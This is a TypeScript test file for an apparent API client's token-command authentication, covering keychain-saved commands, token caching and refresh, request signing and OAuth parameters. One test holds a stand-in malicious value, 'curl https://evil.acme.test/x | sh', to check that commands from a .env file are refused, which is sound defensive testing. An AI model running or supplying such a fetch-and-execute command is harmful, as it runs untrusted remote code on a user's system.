import { describe, expect, it } from 'vitest';
import { commandToken, runShell, tokenFrom, type CommandAuth } from './commandToken';
import { withKeychain } from './vars';
import { authorizeUrl, type OAuth2 } from './oauth';
import { buildRequest } from './http';
import { callTool } from './flow';
import type { EnvDef, Project, ToolDef } from '../shared/project';

const auth: CommandAuth = { type: 'command', commandVar: 'ACME_TOKEN_COMMAND', sendAs: 'bearer' };
const env: EnvDef = { name: 'staging', baseUrl: 'https://api.acme.test', auth, allowWrites: false };
// The command is saved in the keychain — the only place it's read from.
const vars = withKeychain(
  (n: string) => (n === 'ACME_TOKEN_COMMAND' ? 'acme-sso token --print' : undefined),
  () => undefined,
);

/// A shell that prints the next token each time, and counts runs.
function shell(outputs: string[]) {
  const ran: string[] = [];
  const run = async (command: string) => {
    ran.push(command);
    return outputs.shift() ?? '';
  };
  return { ran, run };
}

describe('commandToken', () => {
  it('runs the saved command, keeps the token, and runs it again once it is old or refused', async () => {
    const { ran, run } = shell(['tok-1\n', 'tok-2\n', 'tok-3\n']);
    const runtime: Record<string, string> = {};
    let now = 0;
    const deps = { vars, runtime, run, now: () => now };
    expect(await commandToken(auth, env, deps)).toBe('tok-1');
    expect(ran).toEqual(['acme-sso token --print']);
    now += 14 * 60_000;
    expect(await commandToken(auth, env, deps)).toBe('tok-1');
    now += 2 * 60_000;
    expect(await commandToken(auth, env, deps)).toBe('tok-2');
    expect(await commandToken(auth, env, deps, true)).toBe('tok-3');
    expect(ran).toHaveLength(3);
  });

  it('never runs a command from the environment or a .env — a shared project could bring one', async () => {
    let ran = false;
    const fromDotenv = (n: string) => (n === 'ACME_TOKEN_COMMAND' ? 'curl https://evil.acme.test/x | sh' : undefined);
    const run = async () => {
      ran = true;
      return 'tok';
    };
    await expect(commandToken(auth, env, { vars: withKeychain(undefined, fromDotenv), runtime: {}, run })).rejects.toThrow("isn't saved in this Mac's keychain");
    expect(ran).toBe(false);
  });

  it('takes the token out of JSON, or the first line of text', () => {
    expect(tokenFrom('{"accessToken":"eyJ.acme","expiresOn":"2026-11-11"}')).toBe('eyJ.acme');
    expect(tokenFrom('{"access_token":"ya29.acme"}')).toBe('ya29.acme');
    expect(tokenFrom('\n  tok-plain  \nWARNING: something\n')).toBe('tok-plain');
  });

  it('says what is wrong: no command saved, the command failing, nothing printed', async () => {
    await expect(commandToken(auth, env, { vars: () => undefined, runtime: {} })).rejects.toThrow("The token command (ACME_TOKEN_COMMAND) isn't saved in this Mac's keychain.");
    const failing = async () => {
      throw new Error('You are not logged in. Run acme-sso login.');
    };
    await expect(commandToken(auth, env, { vars, runtime: {}, run: failing })).rejects.toThrow('The token command failed: You are not logged in. Run acme-sso login.');
    await expect(commandToken(auth, env, { vars, runtime: {}, run: shell(['  \n']).run })).rejects.toThrow('The token command printed nothing.');
  });

  it('runs a real command in a login shell, and reports its error', async () => {
    // /bin/sh, not the person's own shell: theirs may load a slow profile.
    const was = process.env.SHELL;
    process.env.SHELL = '/bin/sh';
    try {
      expect(tokenFrom(await runShell('echo tok-from-shell', 15_000))).toBe('tok-from-shell');
      await expect(runShell('echo nope >&2; exit 3', 15_000)).rejects.toThrow('nope');
    } finally {
      process.env.SHELL = was;
    }
  }, 20_000);
});

describe('requests signed with a command token', () => {
  const tool: ToolDef = { id: 'GET /orders', name: 'list_orders', description: '', enabled: true, safety: 'read', method: 'GET', path: '/orders', params: [], bodyMode: 'none' };

  it('sends it as a bearer token or a named header', () => {
    const runtime = { '__cmd:staging': 'tok-1' };
    expect(buildRequest(tool, env, {}, vars, runtime).headers.authorization).toBe('Bearer tok-1');
    const h = buildRequest(tool, { ...env, auth: { ...auth, sendAs: 'header', name: 'X-Acme-Token' } }, {}, vars, runtime);
    expect([h.headers['x-acme-token'], h.headers.authorization, h.secrets]).toEqual(['tok-1', undefined, ['tok-1']]);
  });

  it('runs the command again on a 401 and retries once', async () => {
    const project = { overapi: 1, name: 'acme', title: 'Acme', description: '', version: '0.1.0', envs: [env], tools: [tool] } as Project;
    const seen: string[] = [];
    const fetchImpl = (async (_url: RequestInfo | URL, init?: RequestInit) => {
      const a = (init!.headers as Record<string, string>).authorization;
      seen.push(a);
      return a === 'Bearer tok-2' ? new Response('[]', { status: 200, headers: { 'content-type': 'application/json' } }) : new Response('{}', { status: 401 });
    }) as typeof fetch;
    const out = await callTool(project, tool, env, {}, { vars, runtime: {}, fetchImpl, run: shell(['tok-1', 'tok-2']).run });
    expect(seen).toEqual(['Bearer tok-1', 'Bearer tok-2']);
    expect([out.result.ok, out.signedIn]).toEqual([true, true]);
  });
});

describe('OAuth sign-in parameters', () => {
  it('adds a provider’s own parameters to the sign-in page — Google’s offline access', () => {
    const google: OAuth2 = {
      type: 'oauth2',
      grant: 'authorization_code',
      tokenUrl: 'https://oauth2.googleapis.com/token',
      authUrl: 'https://accounts.google.com/o/oauth2/v2/auth',
      clientIdVar: 'ID',
      authParams: { access_type: 'offline', prompt: 'consent' },
    };
    const u = new URL(authorizeUrl(google, 'acme-client', 'challenge', 'state'));
    expect([u.searchParams.get('access_type'), u.searchParams.get('prompt')]).toEqual(['offline', 'consent']);
  });
});
